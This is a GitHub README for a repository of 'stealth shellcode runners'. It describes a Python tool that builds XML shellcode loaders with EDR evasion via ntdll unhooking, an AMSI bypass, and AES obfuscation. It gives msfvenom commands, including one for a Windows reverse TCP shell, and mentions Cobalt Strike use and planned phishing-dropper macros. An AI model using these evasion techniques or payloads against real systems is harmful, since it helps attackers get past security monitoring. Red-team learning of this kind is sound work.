# Stealth shellcode runners :wolf:
## EDR evasion via ntdll unhooking (userland), AMSI bypass via in memory patch, and obfuscation via AES encryption.

### This repo was started as a place to host a xml shellcode generating tool written as part of a [blog post](https://github.com/kymb0/kymb0.github.io/blob/master/_posts/2021-05-07-defeat-edr-unhook.md) on EDR evasion via ntdll unhooking (userland), AMSI bypass via in memory patch, and obfuscation via AES encryption.

I started writing these tools as a way to both challenge myself and expand upon my knowledge within the esoteric world of AV/EDR evasion.
Currently tested again 1 x enterprise grade EDR solution, however I expect that this technique will be patched soon.

## :eight_spoked_asterisk: stealth_xml_shellcode_runner.py: 
Requires: `python3, pycryptodome`
Usage: `script.py payload.bin`  
Example payloads: `msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin`  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > shell.bin`

For Cobalt Strike you will need to use a custom profile, and using the payload generator seems to work best, rather than selecting Windows Executable from packages.

If anyone wants to build their own tools/malware in C#, there are many fantastic resources out there, however I also included some c# templates that you can reference.

### To do:
[:gem:] Build option to generate payload for `C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe`  
[:gem:] Build option to generate macros for use with phishing droppers  
[:gem:] Add options for different obfuscation and evasion techniques e.g. explore Halo's gate implementation  

I keep my notes on malware dev [here](https://github.com/kymb0/Malware_learns)

Follow me on [twitter](https://twitter.com/kymb0_irl) if you want.
